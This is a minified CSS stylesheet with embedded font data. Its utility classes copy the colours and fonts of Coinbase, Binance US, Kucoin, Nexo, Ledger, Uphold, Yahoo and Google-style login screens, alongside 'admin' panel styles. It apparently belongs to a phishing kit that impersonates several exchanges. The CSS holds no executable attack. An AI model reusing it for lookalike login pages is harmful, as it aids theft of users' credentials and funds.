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)format("woff2")
    }

    .mb-20 {
        margin-bottom: 5rem
    }

    .mt-12 {
        margin-top: 3rem
    }

    .mt-8 {
        margin-top: 2rem
    }

    .flex {
        display: flex
    }

    .h-3 {
        height: 0.75rem
    }

    .h-full {
        height: 100%
    }

    .min-h-fit {
        min-height: fit-content
    }

    .w-3 {
        width: 0.75rem
    }

    .w-full {
        width: 100%
    }

    .max-w-md {
        max-width: 28rem
    }

    .flex-grow {
        flex-grow: 1
    }

    @keyframes binance-bars {
        0% {
            transform: scaleY(0.4)
        }

        40% {
            transform: scaleY(0.4)
        }

        to {
            transform: scaleY(0.4)
        }

        20% {
            transform: scaleY(1)
        }
    }

    .animate-coinbase-dots-loading-1 {
        animation: cb-dots 2s infinite
    }

    .animate-coinbase-dots-loading-2 {
        animation: cb-dots 2s infinite 0.1s
    }

    @keyframes cb-dots {
        0% {
            transform: translateY(0)
        }

        40% {
            transform: translateY(30px)
        }

        to {
            transform: translateY(0)
        }
    }

    .animate-coinbase-dots-loading-3 {
        animation: cb-dots 2s infinite 0.2s
    }

    @keyframes pulse {
        50% {
            opacity: 0.5
        }
    }

    @keyframes spin {
        to {
            transform: rotate(360deg)
        }
    }

    .flex-col {
        flex-direction: column
    }

    .items-center {
        align-items: center
    }

    .justify-center {
        justify-content: center
    }

    .justify-between {
        justify-content: space-between
    }

    .gap-5 {
        gap: 1.25rem
    }

    .rounded-\[16px\] {
        border-radius: 16px
    }

    .rounded-full {
        border-radius: 9999px
    }

    .bg-\[\#0052FF\] {
        --tw-bg-opacity: 1;
        background-color: rgb(0 82 255/var(--tw-bg-opacity, 1))
    }

    .bg-coinbase-background {
        --tw-bg-opacity: 1;
        background-color: rgb(10 11 13/var(--tw-bg-opacity, 1))
    }

    .p-6 {
        padding: 1.5rem
    }

    .p-8 {
        padding: 2rem
    }

    .px-6 {
        padding-left: 1.5rem;
        padding-right: 1.5rem
    }

    .pb-2 {
        padding-bottom: 0.5rem
    }

    .pb-8 {
        padding-bottom: 2rem
    }

    .pt-12 {
        padding-top: 3rem
    }

    .pt-5 {
        padding-top: 1.25rem
    }

    .text-center {
        text-align: center
    }

    .font-coinbase-sans {
        font-family: CBSans
    }

    .font-coinbase-text {
        font-family: CBText
    }

    .font-coinbase-title {
        font-family: CBDisplay
    }

    .text-\[28px\] {
        font-size: 28px
    }

    .font-light {
        font-weight: 300
    }

    .font-semibold {
        font-weight: 600
    }

    .text-coinbase-foreground-muted {
        --tw-text-opacity: 1;
        color: rgb(138 145 158/var(--tw-text-opacity, 1))
    }

    .text-coinbase-primary {
        --tw-text-opacity: 1;
        color: rgb(87 139 250/var(--tw-text-opacity, 1))
    }

    .text-white {
        --tw-text-opacity: 1;
        color: rgb(255 255 255/var(--tw-text-opacity, 1))
    }

    .placeholder-\[\#555555\]::-moz-placeholder {
        --tw-placeholder-opacity: 1;
        color: rgb(85 85 85/var(--tw-placeholder-opacity, 1))
    }

    .placeholder-\[\#555555\]::placeholder {
        --tw-placeholder-opacity: 1;
        color: rgb(85 85 85/var(--tw-placeholder-opacity, 1))
    }

    .placeholder-white\/20::-moz-placeholder {
        color: #fff3
    }

    .placeholder-white\/20::placeholder {
        color: #fff3
    }

    .scrollbar-thin::-webkit-scrollbar-track {
        background-color: var(--scrollbar-track);
        border-radius: var(--scrollbar-track-radius)
    }

    .scrollbar-thin::-webkit-scrollbar-track:hover {
        background-color: var(--scrollbar-track-hover, var(--scrollbar-track))
    }

    .scrollbar-thin::-webkit-scrollbar-track:active {
        background-color: var(--scrollbar-track-active, var(--scrollbar-track-hover, var(--scrollbar-track)))
    }

    .scrollbar-thin::-webkit-scrollbar-thumb {
        background-color: var(--scrollbar-thumb);
        border-radius: var(--scrollbar-thumb-radius)
    }

    .scrollbar-thin::-webkit-scrollbar-thumb:hover {
        background-color: var(--scrollbar-thumb-hover, var(--scrollbar-thumb))
    }

    .scrollbar-thin::-webkit-scrollbar-thumb:active {
        background-color: var(--scrollbar-thumb-active, var(--scrollbar-thumb-hover, var(--scrollbar-thumb)))
    }

    .scrollbar-thin::-webkit-scrollbar-corner {
        background-color: var(--scrollbar-corner);
        border-radius: var(--scrollbar-corner-radius)
    }

    .scrollbar-thin::-webkit-scrollbar-corner:hover {
        background-color: var(--scrollbar-corner-hover, var(--scrollbar-corner))
    }

    .scrollbar-thin::-webkit-scrollbar-corner:active {
        background-color: var(--scrollbar-corner-active, var(--scrollbar-corner-hover, var(--scrollbar-corner)))
    }

    .scrollbar-thin::-webkit-scrollbar {
        display: block;
        width: 8px;
        height: 8px
    }

    .scrollbar-none::-webkit-scrollbar {
        display: none
    }

    html,
    body,
    #root {
        height: 100%
    }

    .after\:absolute:after {
        content: var(--tw-content);
        position: absolute
    }

    .after\:left-\[2px\]:after {
        content: var(--tw-content);
        left: 2px
    }

    .after\:top-0\.5:after {
        content: var(--tw-content);
        top: 0.125rem
    }

    .after\:h-5:after {
        content: var(--tw-content);
        height: 1.25rem
    }

    .after\:w-5:after {
        content: var(--tw-content);
        width: 1.25rem
    }

    .after\:rounded-full:after {
        content: var(--tw-content);
        border-radius: 9999px
    }

    .after\:border:after {
        content: var(--tw-content);
        border-width: 1px
    }

    .after\:border-gray-300:after {
        content: var(--tw-content);
        --tw-border-opacity: 1;
        border-color: rgb(209 213 219/var(--tw-border-opacity, 1))
    }

    .after\:bg-white:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
    }

    .after\:transition-all:after {
        content: var(--tw-content);
        transition-property: all;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        transition-duration: 0.15s
    }

    .after\:content-\[\'\'\]:after {
        --tw-content: "";
        content: var(--tw-content)
    }

    .focus-within\:border-\[\#48ff91\]:focus-within {
        --tw-border-opacity: 1;
        border-color: rgb(72 255 145/var(--tw-border-opacity, 1))
    }

    .focus-within\:border-b-white:focus-within {
        --tw-border-opacity: 1;
        border-bottom-color: rgb(255 255 255/var(--tw-border-opacity, 1))
    }

    .focus-within\:ring-2:focus-within {
        --tw-ring-offset-shadow: var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset)0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0#0000)
    }

    .focus-within\:ring-\[\#0066cc\]:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(0 102 204/var(--tw-ring-opacity, 1))
    }

    .focus-within\:ring-admin-primary:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(57 67 183/var(--tw-ring-opacity, 1))
    }

    .focus-within\:ring-binanceus-gold:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(255 215 0/var(--tw-ring-opacity, 1))
    }

    .focus-within\:ring-black:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(0 0 0/var(--tw-ring-opacity, 1))
    }

    .focus-within\:ring-coinbase-primary:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(87 139 250/var(--tw-ring-opacity, 1))
    }

    .focus-within\:ring-nexo-primary:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(108 203 197/var(--tw-ring-opacity, 1))
    }

    .focus-within\:ring-white:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(255 255 255/var(--tw-ring-opacity, 1))
    }

    .group:focus-within .group-focus-within\:text-\[\#0b57d0\] {
        --tw-text-opacity: 1;
        color: rgb(11 87 208/var(--tw-text-opacity, 1))
    }

    .group:focus-within .group-focus-within\:text-\[\#b3261e\] {
        --tw-text-opacity: 1;
        color: rgb(179 38 30/var(--tw-text-opacity, 1))
    }

    .group:hover .group-hover\:text-white {
        --tw-text-opacity: 1;
        color: rgb(255 255 255/var(--tw-text-opacity, 1))
    }

    .group:hover .group-hover\:opacity-100 {
        opacity: 1
    }

    .group:focus .group-focus\:border-\[\#444746\] {
        --tw-border-opacity: 1;
        border-color: rgb(68 71 70/var(--tw-border-opacity, 1))
    }

    .group:focus .group-focus\:bg-\[\#ebebeb\] {
        --tw-bg-opacity: 1;
        background-color: rgb(235 235 235/var(--tw-bg-opacity, 1))
    }

    .peer:checked~.peer-checked\:after\:translate-x-full:after {
        content: var(--tw-content);
        --tw-translate-x: 100%;
        transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
    }

    .peer:checked~.peer-checked\:after\:border-white:after {
        content: var(--tw-content);
        --tw-border-opacity: 1;
        border-color: rgb(255 255 255/var(--tw-border-opacity, 1))
    }

    .peer:focus~.peer-focus\:text-white {
        --tw-text-opacity: 1;
        color: rgb(255 255 255/var(--tw-text-opacity, 1))
    }

    .hover\:border-blue-500:hover {
        --tw-border-opacity: 1;
        border-color: rgb(59 130 246/var(--tw-border-opacity, 1))
    }

    .hover\:border-b-\[\#1652f0\]:hover {
        --tw-border-opacity: 1;
        border-bottom-color: rgb(22 82 240/var(--tw-border-opacity, 1))
    }

    .hover\:bg-\[\#004fe6\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(0 79 230/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#004fe6\]\/90:hover {
        background-color: #004fe6e6
    }

    .hover\:bg-\[\#005da6\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(0 93 166/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#014cec\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(1 76 236/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#0e4eb5\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(14 78 181/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#0f1012\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(15 16 18/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#262626\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(38 38 38/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#2c333a\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(44 51 58/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#3a3d45\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(58 61 69/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#404142\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(64 65 66/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#507fe5\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(80 127 229/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#5422c7\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(84 34 199/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#6001d2\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(96 1 210/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#81dfd9\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(129 223 217/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#d6c8fc\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(214 200 252/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#e0e0e0\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(224 224 224/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#e6e6e6\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(230 230 230/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#e8e8e8\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(232 232 232/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#ededf0\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(237 237 240/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#f5f8fd\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(245 248 253/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#f6f6f6\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(246 246 246/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#f8d12f\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(248 209 47/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-\[\#fafafa\]:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(250 250 250/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-admin-line:hover {
        background-color: #8a919e33
    }

    .hover\:bg-black:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(0 0 0/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-black\/10:hover {
        background-color: #0000001a
    }

    .hover\:bg-coinbase-line\/10:hover {
        background-color: #8a919e1a
    }

    .hover\:bg-gray-100:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(243 244 246/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-gray-300:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(209 213 219/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-uphold-line\/10:hover {
        background-color: #68738a1a
    }

    .hover\:bg-white:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
    }

    .hover\:bg-opacity-15:hover {
        --tw-bg-opacity: 0.15
    }

    .hover\:bg-opacity-5:hover {
        --tw-bg-opacity: 0.05
    }

    .hover\:text-\[\#0052ff\]:hover {
        --tw-text-opacity: 1;
        color: rgb(0 82 255/var(--tw-text-opacity, 1))
    }

    .hover\:text-\[\#111\]:hover {
        --tw-text-opacity: 1;
        color: rgb(17 17 17/var(--tw-text-opacity, 1))
    }

    .hover\:text-\[\#1652f0\]:hover {
        --tw-text-opacity: 1;
        color: rgb(22 82 240/var(--tw-text-opacity, 1))
    }

    .hover\:text-\[\#3e70d8\]:hover {
        --tw-text-opacity: 1;
        color: rgb(62 112 216/var(--tw-text-opacity, 1))
    }

    .hover\:text-\[\#82d8b9\]:hover {
        --tw-text-opacity: 1;
        color: rgb(130 216 185/var(--tw-text-opacity, 1))
    }

    .hover\:text-\[\#999999\]:hover {
        --tw-text-opacity: 1;
        color: rgb(153 153 153/var(--tw-text-opacity, 1))
    }

    .hover\:text-\[\#ab9ff2\]:hover {
        --tw-text-opacity: 1;
        color: rgb(171 159 242/var(--tw-text-opacity, 1))
    }

    .hover\:text-binanceus-gold:hover {
        --tw-text-opacity: 1;
        color: rgb(255 215 0/var(--tw-text-opacity, 1))
    }

    .hover\:text-kucoin-black\/60:hover {
        color: #1d1d1d99
    }

    .hover\:text-ledger-primary:hover {
        --tw-text-opacity: 1;
        color: rgb(185 176 249/var(--tw-text-opacity, 1))
    }

    .hover\:text-white:hover {
        --tw-text-opacity: 1;
        color: rgb(255 255 255/var(--tw-text-opacity, 1))
    }

    .hover\:text-opacity-90:hover {
        --tw-text-opacity: 0.9
    }

    .hover\:underline:hover {
        text-decoration-line: underline
    }

    .hover\:opacity-100:hover {
        opacity: 1
    }

    .hover\:ring-2:hover {
        --tw-ring-offset-shadow: var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset)0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0#0000)
    }

    .hover\:ring-admin-primary:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(57 67 183/var(--tw-ring-opacity, 1))
    }

    .hover\:ring-binanceus-gold:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(255 215 0/var(--tw-ring-opacity, 1))
    }

    .hover\:ring-black:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(0 0 0/var(--tw-ring-opacity, 1))
    }

    .hover\:ring-black\/70:hover {
        --tw-ring-color: rgb(0 0 0/0.7)
    }

    .hover\:brightness-110:hover {
        --tw-brightness: brightness(1.1);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
    }

    .hover\:brightness-125:hover {
        --tw-brightness: brightness(1.25);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
    }

    .hover\:brightness-150:hover {
        --tw-brightness: brightness(1.5);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
    }

    .hover\:brightness-50:hover {
        --tw-brightness: brightness(0.5);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
    }

    .hover\:brightness-75:hover {
        --tw-brightness: brightness(0.75);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
    }

    .hover\:brightness-90:hover {
        --tw-brightness: brightness(0.9);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
    }

    .focus\:border-\[\#0070D2\]:focus {
        --tw-border-opacity: 1;
        border-color: rgb(0 112 210/var(--tw-border-opacity, 1))
    }

    .focus\:border-yahoo-primary:focus {
        --tw-border-opacity: 1;
        border-color: rgb(125 46 255/var(--tw-border-opacity, 1))
    }

    .focus\:outline-coinbase-primary:focus {
        outline-color: #578bfa
    }

    .focus\:ring-2:focus {
        --tw-ring-offset-shadow: var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset)0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0#0000)
    }

    .focus\:ring-\[\#0066cc\]:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(0 102 204/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-\[\#0b57d0\]:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(11 87 208/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-\[\#7132f5\]:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(113 50 245/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-\[\#82d8b9\]:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(130 216 185/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-\[\#b3261e\]:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(179 38 30/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-admin-primary:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(57 67 183/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-admin-primary\/50:focus {
        --tw-ring-color: rgb(57 67 183/0.5)
    }

    .focus\:ring-binanceus-gold:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(255 215 0/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-black:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(0 0 0/var(--tw-ring-opacity, 1))
    }
